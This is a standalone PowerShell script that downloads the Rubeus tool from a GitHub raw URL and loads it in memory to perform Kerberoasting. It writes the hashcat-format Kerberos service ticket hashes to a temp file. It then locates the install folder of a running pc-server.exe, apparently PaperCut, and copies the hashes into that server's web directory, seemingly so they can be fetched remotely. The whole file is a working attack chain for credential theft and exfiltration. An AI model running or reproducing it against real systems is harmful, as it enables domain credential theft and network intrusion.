$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$hashFile = Join-Path $env:TEMP "kerb.txt"
Remove-Item $hashFile -Force -ErrorAction SilentlyContinue

$bytes = (New-Object Net.WebClient).DownloadData("$root/Rubeus.exe")
$assembly = [Reflection.Assembly]::Load($bytes)
$arguments = [string[]]@(
    "kerberoast",
    "/outfile:$hashFile",
    "/format:hashcat",
    "/nowrap"
)
$assembly.EntryPoint.Invoke($null, @(, $arguments))

if (-not (Test-Path $hashFile)) {
    Write-Output "RUBEUS_KERB_FILE_MISSING"
    exit 1
}

$server = Get-CimInstance Win32_Process -Filter "Name='pc-server.exe'" |
    Select-Object -First 1
$binWin = Split-Path $server.ExecutablePath -Parent
$bin = Split-Path $binWin -Parent
$pcHome = Split-Path $bin -Parent
$web = Join-Path $pcHome "custom\web"
Copy-Item $hashFile (Join-Path $web "kerb.txt") -Force
Write-Output "RUBEUS_KERB_FILE_DONE"
